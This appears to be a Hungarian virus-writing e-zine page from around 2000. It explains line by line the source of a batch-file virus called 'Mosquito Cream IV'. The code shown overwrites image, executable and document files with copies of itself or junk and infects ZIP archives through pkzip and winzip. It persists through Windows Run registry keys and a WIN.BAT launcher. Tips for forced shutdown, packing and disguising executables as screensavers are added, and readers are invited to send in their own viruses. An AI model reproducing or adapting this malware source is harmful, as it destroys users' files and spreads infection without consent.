    VMI.BAT-ban:<br>
    ren %0 TEST.TXT<br>
    Aztat jelenti, hogy a vmi.bat átnevezi magát TEST.TXT-vé.<br>
    És ammeg mér jó, hogy a bmp-ket is felülírtuk. Nos, ami ebben a html kódban van, az
    nem a teljes vírus, mert az eredeti tartalmaz még egy BM (BitMap) header-t is. Bat
    futásakor ez nincs figyelembe véve, de ha a varust átnevezzük BMP-re, akkor egy
    nézhetõ BMP-t kapunk. (Ekkor meg a víruskód, a BAT kódja lesz figyelmen kívül
    hagyva, mert a BMP fejlécben megadott szegmensen kívül esik.)<br>
    <br>
    for %%i in (%windir%\Desktop\*.bmp,*.gif,*.jpg,*.bat,*.exe) do copy %0 %%i&gt;nul<br>
    for %%i in (%windir%\Desktop\*.gif,*.jpg) do ren %%i *.bmp&gt;nul<br>
    for %%i in (%windir%\WEB\*.bmp,*.gif,*.jpg,*.bat) do copy %0 %%i&gt;nul<br>
    for %%i in (%windir%\WEB\*.gif,*.jpg) do ren %%i *.bmp&gt;nul<br>
    for %%i in (C:\Docume~1\*.bmp,*.gif,*.jpg,*.bat,*.exe) do copy %0 %%i&gt;nul<br>
    for %%i in (C:\Docume~1\*.gif,*.jpg) do ren %%i *.bmp&gt;nul<br>
    Ua. mint elõzõleg, csak most az EXE-ket is felülírjuk a legkülönfélébb
    könyvtárakban.<br>
    (Nevezz át egy BMP-ot EXE-re, és indítsd el, majd csodálkozz!) <br>
    <br>
    echo MOSQUITO CREAM IV &gt;x<br>
    echo. &gt;&gt;x&nbsp;<br>
    echo \\ &gt;&gt;x<br>
    echo OooO@- &gt;&gt;x<br>
    echo // &gt;&gt;x<br>
    echo. &gt;&gt;x<br>
    echo # ITALIAN PRODUCTION 1999 # By StRaMoNiUm&gt;&gt;x<br>
    @move x %tmp%\x<br>
    Ez a blokk elkészíti az x. nevû fájlt, egy apró ASCII grafikát téve bele, majd az
    egészet a windows TEMP folderbe helyezi át. <br>
    <br>
    %TMP%<br>
    No comment. C:\WINDOWS\TEMP<br>
    <br>
    @if exist *.zip goto :BZzip<br>
    @if not exist *.zip goto :BZskip<br>
    Most, hogy már BMP-t is fertõztünk, ideje egy kis ZIP munkába kezdeni.Ha találtunk
    ZIp fájlt, akkor ugrunk a BZzip címkére. <br>
    <br>
    GOTO :LABEL<br>
    No comment, vettük, méghozzá részletesen.<br>
    <br>
    :BZzip<br>
    ECHO n BZ.Z&gt;%tmp%\bzz.z<br>
    ECHO e 100 4D 5A E2 01 02 00 00 00 02 00 C3 0F FF FF F0 FF&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 110 FE FF 00 .. .. . és így tovább....<br>
    ECHO rcx&gt;&gt;%tmp%\bzz.z<br>
    ECHO 410&gt;&gt;%tmp%\bzz.z<br>
    ECHO.&gt;&gt;%tmp%\bzz.z<br>
    ECHO.&gt;&gt;%tmp%\bzz.z<br>
    ECHO w&gt;&gt;%tmp%\bzz.z<br>
    ECHO.&gt;&gt;%tmp%\bzz.z<br>
    ECHO.&gt;&gt;%tmp%\bzz.z<br>
    ECHO q&gt;&gt;%tmp%\bzz.z<br>
    <br>
    Ideugrottunk a Bzzip címkéhez, és eztete találtuk itt ni.<br>
    Szerencsére megtanultuk az elõzõ viriiben a debug alkalmazását, és azt is, hogy mit
    és mijér csinyál. <br>
    Egyszerûen debug híváson keresztûl egy EXE-t készítünk ebbõl a Hexa formátumú
    szarból. Ja. Míg el nem felejtem. Létezik két aranyos progi, és amint
    megtalálom,beteszem az ezine-be is. vagy maj csatolom a 3. résznél. Olyan mindegy.
    Szóval az egyik a BAT2COM, mely BÁRMILYEN BAT állományt COM-á konvertál. Ez nem
    éppen egyszerû feladat, de megoldható. Tök ua elven mûködik mint a compilerek
    többsége... Illetve a COM2EXE. Ez gondolom érthetõ. Persze a COM -&gt; EXE konvertálást
    egyszerû átnevezéssel is megadhatjuk, az már édesmindegy. Azonban az EXE2COM már nem
    ilyen egyszerû. De ügyes emberek erre is kitaláltak megoldást. Egyébként a
    lefordított EXE nem más mint a vírus maga, csak COM-ban. (a BAT2COM segítségével
    lett lefordítva). </font></p>
    <p align="left"><font face="Verdana" size="2">goto :BuZZ </font></p>
    <p align="left"><font face="Verdana" size="2">A BuZZ címkén pedig a következõket találjuk:<br>
    <br>
    :BuZZ<br>
    @move Bz.Z %tmp%\Setup.exe&gt;nul<br>
    @copy %0 %tmp%\Setup.BMP&gt;nul<br>
    @if exist Pkzip.exe goto :Bzext<br>
    @if not exist Pkzip.exe goto :BzrZ<br>
    <br>
    Tehát. áthelyezzük (és útközben át is nevezzük) az elkészült Bz.z-t a&nbsp; <a
    href="file:///C:/WINDOWS/TEMP/">C:\WINDOWS\TEMP\</a> könyvtárban<br>
    Setup.exe-re, majd átmásoljuk magát a vírust, az aktuális fájlt (%0), a
    C:\WINDOWS\TEMP\ (%TMP%)&nbsp;-be, de mint setup.bmp fájl.<br>
    <br>
    Sõt, ha a PKZIP.EXE megtalálható az aktuális alkönyvtárban, akkor a következõt is
    megcsinyalja:<br>
    <br>
    for %%i in (*.zip ../*.zip) DO pkzip -e0 -u -r -k %%i %tmp%\Setup.exe&gt;nul<br>
    for %%i in (*.zip ../*.zip) DO pkzip -e0 -u -r -k %%i %tmp%\Setup.BMP&gt;nul<br>
    <br>
    vagyis: az aktuális alkönyvtár minden egyes ZIP fájlját a -u kapcsolóval update-eli,
    vagyis frissíti, hozzájuk csapva a %TMP%-ben megtalálható setup.exe és .bat
    fájlokkal. Hogy ez ne tartson túlságosan sok ideig, a fájlokat nem tömöríti, csak
    hozzáfûzi (-e0). És persze, hogy a dátum se változzon, használja a -k kapcsolót is.<br>
    <br>
    :BzrZ<br>
    for %%i in (*.zip ..\*.zip) do start /m winzip32 -a /%%i &quot;%tmp%\Setup.exe&quot;
    &quot;%tmp%\Setup.BMP&quot;&gt;nul<br>
    goto :Bzskip<br>
    <br>
    Ez itt felül csak egy &quot;biztonsági&quot; intézkedés arra az esetre, ha netalán
    nem lenne PKZIP-je valakinek, de winzip-et használ, akkor nehogymá õ is kimaradjon... Félreértés
    ne essék, a winzip grafikus felülete meg sem nyikkan... Nézzünk csak rá a
    paraméterekre.(Kérje le mindenki a winzip32 /h-t)<br>
    Mondjuk a paraméterek még érthetõ, de a sor elég érdekesen néz ki: <br>
    <br>
    -&gt; /%%i &lt;-.<br>
    <br>
    No ez mi? Ha nem írjuk be, akkor a winzip ablaka szépen megjelenik, illetve
    dos-üzemmódban ír a képernyõre. Még akkor is, ha használjuk a START parancsot.
    Asszem errõl is volt szó legutóbb, úgyhogy csak röviden. </font></p>
    <p align="left"><font face="Verdana" size="2"><br>
    START<br>
    <br>
    Ezen parancs segítségével egy progit futtathatunk.<br>
    <br>
    /m[inimized] A háttérben futtat.<br>
    <br>
    /max[imized] Az elõtérben futtat.<br>
    <br>
    /r[estored] Alapbeállítás. fogjuk és futtatjuk a progit annak a beállításaival.<br>
    <br>
    /w[ait] Várakozás az elõzõ futó alkalmazás befejezésére. ha befejezte amaz,
    elindul emez. ezt sokmindenre ki lehet használni.<br>
    <br>
    :BZskip<br>
    for %%i in (*.bmp,*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf,*.bat ..\*.bat,*.bmp) do copy %0
    %%i&gt;nul<br>
    for %%i in (*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf) do ren %%i *.bmp&gt;nul<br>
    for %%i in (s*.exe,a*.exe,b*.exe,o*.exe,i*.exe,_*.exe) do copy %0 %%i&gt;nul<br>
    for %%i in (*.txt,*.doc,*.rtf ..\*.txt,*.doc,*.rtf) do copy %tmp%\x %%i&gt;nul<br>
    cd..<br>
    <br>
    Asszem érthetõ... Semmi új. <br>
    A cd..-vel egy felsõbb (parent) könyvtárba lépünk, és ott is elvégezzük a
    &quot;dolgunk&quot; annyi változatatással, hogy a TXT,DOC és RTF fájlokhoz az ASCII-s
    rajzunkat hozzácsapjuk. ha itt van ZIP fájl, akkor nosza, még egyszer zipelünk... <br>
    <br>
    :BZskip2<br>
    @REGEDIT /E %windir%\BZs.reg
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>
    choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,2&gt;nul<br>
    <br>
    Hah... Ez itt egy jó dolog.<br>
    A batch létrehoz (felülír) két windows registry bejegyzést, amellyel eléri, hogy
    bootoláskor õ is elinduljon.<br>
    We can found, firstly the command REGEDIT /E, to save ALL the specified key&nbsp; </font></p>
    <p align="left"><font face="Verdana" size="2">Azonban a régi bejegyzéseket is
    megtartjuk, a /E kapcsoló segítségével kiírjuk õket a BZs.reg fileba.<br>
    <br>
    Majd jön a CHOICE utasítás:<br>
    Itt a CHOICE egy érdekes feladatot kap, ugyanis itt várakoztatásra használják. Erre
    azért van szükség, mert túl gyors processzor esetén a hozzáfûzési procedurát
    &quot;átugorhatják&quot;. (kiírják a cache-be, és nem kerül konkrétan lemezre.) <br>
    <br>
    A CHOICE mûködését is megnéztük, még legutóbb... (Úgy emléxem)<br>
    <br>
    ECHO &quot;0A StRaMoNiUm&quot;=&quot;c:\\command /C ren C:\\Mosquito.bmp
    Mosquito.bat|CLS&quot;&gt;&gt;%windir%\BZs.reg<br>
    ECHO &quot;1A Dark_Elf&quot;=&quot;start /m C:\\Mosquito.bat&quot;&gt;&gt;%windir%\BZs.reg<br>
    echo.<br>
    echo jgcxjhgkjhcxgkjdhflkgjhxhjxhjjjhjkfjjkhjhjfjjhjjhj&gt;nul<br>
    echo.<br>
    echo ciyjouigydujujhgfkjbkjhgdkjhgjhjugkjghkdjhykugrhtiug&gt;nul<br>
    choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,1&gt;nul<br>
    echo.<br>
    @regedit /S /C %windir%\BZs.reg<br>
    <br>
    Az ECHO segítségével néhány új kulcsot is hozzáadunk a .reg fájlhoz.<br>
    <br>
    (&quot;0A StRaMoNiUm&quot;=&quot;c:\\command /C ren C:\\Mosquito.bmp Mosquito.bat|CLS)<br>
    <br>
    Átnevezzük a BMP-nlet bat-ra, maj töröljük a képernyõt.<br>
    <br>
    (&quot;1A Dark_Elf&quot;=&quot;start /m C:\\Mosquito.bat&quot;) futtatja a vírust a
    háttérben<br>
    <br>
    A sok echo és echo. megint a processzoridõ kitöltésére szolgál...<br>
    <br>
    Ezután a .reg fájlukat hozzáadjuk a windózéhoz. <br>
    <br>
    A COMMAND használatát is megbeszéltük. <br>
    <br>
    @cls<br>
    @type %tmp%\x<br>
    <br>
    Képernyõtörlés, a type segítségével megjelenítjük az ASCII képünket.<br>
    <br>
    for %%i in (%tmp%\*.*) do DEL %%i&gt;nul<br>
    @copy %0 c:\MOSQUITO.BMP&gt;nul<br>
    @copy %0 %windir%\DVC.EXE&gt;nul<br>
    <br>
    Ez már tényleg csak idõhúzás. Újabb másolatok.<br>
    <br>
    ECHO @Echo off&gt;%windir%\WIN.BAT<br>
    ECHO @if exist c:\Mosquito.BMP goto :BZ&gt;&gt;%windir%\WIN.BAT<br>
    ECHO @if not exist c:\Mosquito.bat goto :BZXT<br>
    ECHO :BZXT&gt;&gt;%windir%\WIN.BAT<br>
    ECHO @ren DVC.EXE BZz.bat&gt;&gt;%windir%\WIN.BAT<br>
    ECHO @copy BZz.bat DVC.EXE&gt;&gt;%windir%\WIN.BAT<br>
    ECHO @start /m BZz.bat&gt;&gt;%windir%\WIN.BAT<br>
    ECHO :BZ&gt;&gt;%windir%\WIN.BAT<br>
    ECHO CLS&gt;&gt;%windir%\WIN.BAT<br>
    <br>
    Most egy win.bat-ot készítünk a vírusról. Ez arra jó, hogy 3.1-es rendszerben, ahol
    nincs regisztrációs adatbázis, a vírust elindítjuk még a windos elõtt. Az MSDOS-ról
    meg kell még jegyezni, hogy ha van egy win.bat, win.com és egy win.exe fájl egy
    alkönyvtárban elõször a bat, maj a com, és legvégül az exe indul el. És ez azér
    szerencsés, mer mikor a windóz elindul a rendszer a fájlt nem mint win.com, hanem
    kiterjesztés nélkül, csak mint win hívja meg.<br>
    <br>
    A Win.bat megnézi, hogy létezik e a mosquito.bat fájl, és ha igen, akkor nem csinál
    semmit, kilép. Ha nem, akkor elindul a vírus a háttérben.T<br>
    <br>
    Most nézzünk egy kis érdekességet, néhány tippet: <br>
    <br>
    RUNDLL USER,#7 0 5<br>
    <br>
    A fenti parancs azonnali leállásra készteti a vindózt, mindenféle kérdés nélkül.
    (Rendkívül vicces poén.)<br>
    Kisebb exe fájlokat assembler, illetve a Winzip Self-Extractor, sõt, legjobb megoldásként
    az <a href="http://www.upx.tsx.org">upx</a> használatával érhetsz el.<br>
    Ha egy EXE-t átnevezel SCR formára (ami a képernyõvédõk kiterjesztése), akkor a
    programnak (unsuspected) rossz kiterjesztése lessz, de kattintással, meghívással
    futtatható normális EXE-ként, sõt, ha ez a fájl eredetileg winzip önkicsomagoló EXE
    volt, akkor a jobb egérgomb hatására nem jön elõ az &quot;OPEN WITH WINZIP&quot;
    üzenet, hanem helyette az &quot;INSTALL&quot; vagy &quot;TRY&quot;. (Legalábbis angol
    windosban.) <br>
    </font></p>
    <p align="left"><font face="Verdana" size="2">Ennyi volt, remélem mostanra már mindenki
    majnem profi... :)</font></p>
    <p align="left"><font face="Verdana" size="2">Kérés kérdés, panasz, óhaj, sóhaj, a
    sajátkészítésû virii-k, vagy ha csak úgy érzitek, meg bármi miatt írjatok a
    postámba.&nbsp;<br>
    <br>
    </font></p>
    <p align="center"><b><i><u><font face="Verdana" size="2"><br>
    Készítette : Black Cat</font><font face="Times New Roman" size="4"><br>
    </font></u></i></b></td>
  </tr>
</table>
</center></div><div align="center"><center>

<table border="0" width="100%" cellspacing="0" cellpadding="0">
  <tr>
    <td width="100%" bgcolor="#454545" height="10"><small><strong><p align="center"><font face="Verdana"
    color="#000000"></font><font face="Verdana" color="#FFFFFF">©2000.
    Fearless Criminal Force.</font></strong></small></td>
  </tr>
</table>
</center></div>
</body>
</html>
